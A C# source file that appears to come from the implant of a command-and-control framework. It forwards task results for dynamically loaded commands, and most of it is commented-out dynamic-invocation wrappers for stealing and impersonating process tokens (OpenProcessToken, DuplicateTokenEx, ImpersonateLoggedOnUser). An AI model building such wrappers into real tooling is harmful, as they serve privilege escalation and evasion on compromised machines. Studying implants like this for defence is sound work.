using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using DynamicEngLoading;
using static DynamicEngLoading.h_DynInv;

namespace Engineer.Functions
{
    /// <summary>
    /// This class servers to create the wrappers needed for the shared library, so dynamic comands can still access these functions
    /// dynamic commands will call the ForwardingFunctionWrap.Function from the shared library interface that will then call these wrappers at runtime
    /// </summary>
    public class ForwardedFunctionWrappers : IForwardingFunctions
    {
        //this just forwards to the real Tasking call 
        public void FillTaskResults(object output, EngineerTask task, EngTaskStatus taskStatus, TaskResponseType taskResponseType)
        {
            Tasking.FillTaskResults(output, task, taskStatus, taskResponseType);
        }
        // //wrapper for the h_DynInv_Methods call 
        // //wrapper for h_DynInv_Methods.NtFuncWrapper.NtQueryInformationProcessBasicInformation
        // public PROCESS_BASIC_INFORMATION NtQueryInformationProcessBasicInformation(IntPtr processHandle)
        // {
        //     return h_DynInv_Methods.NtFuncWrapper.NtQueryInformationProcessBasicInformation(processHandle);
        // }
        // //wrapper for bool OpenProcessToken(IntPtr ProcessHandle, uint dwDesiredAccess, out IntPtr TokenHandle)
        // public bool OpenProcessToken(IntPtr ProcessHandle, uint dwDesiredAccess, out IntPtr TokenHandle)
        // {
        //     return h_DynInv_Methods.AdvApi32FuncWrapper.OpenProcessToken(ProcessHandle, dwDesiredAccess, out TokenHandle);
        // }
        // //wrapper for bool CloseHandle(IntPtr hObject)
        // public bool CloseHandle(IntPtr hObject)
        // {
        //     return h_DynInv_Methods.Ker32FuncWrapper.CloseHandle(hObject);
        // }
        // //wrapper for bool IsWow64Process(IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)] out bool Wow64Process) 
        // public bool IsWow64Process(IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)] out bool Wow64Process)
        // {
        //     return h_DynInv_Methods.Ker32FuncWrapper.IsWow64Process(hProcess, out Wow64Process);
        // }
        // //wrapper for  bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, ref Win32.WinBase._SECURITY_ATTRIBUTES lpTokenAttributes, Win32.WinNT._SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, Win32.WinNT.TOKEN_TYPE TokenType, out IntPtr phNewToken)
        // public bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, ref Win32.WinBase._SECURITY_ATTRIBUTES lpTokenAttributes, Win32.WinNT._SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, Win32.WinNT.TOKEN_TYPE TokenType, out IntPtr phNewToken)
        // {
        //     return h_DynInv_Methods.AdvApi32FuncWrapper.DuplicateTokenEx(hExistingToken, dwDesiredAccess, ref lpTokenAttributes, ImpersonationLevel, TokenType, out phNewToken);
        // }
        // //wrapper for bool ImpersonateLoggedOnUser(IntPtr hToken)
        // public bool ImpersonateLoggedOnUser(IntPtr hToken)
        // {
        //     return h_DynInv_Methods.AdvApi32FuncWrapper.ImpersonateLoggedOnUser(hToken);
        // }
    }
}
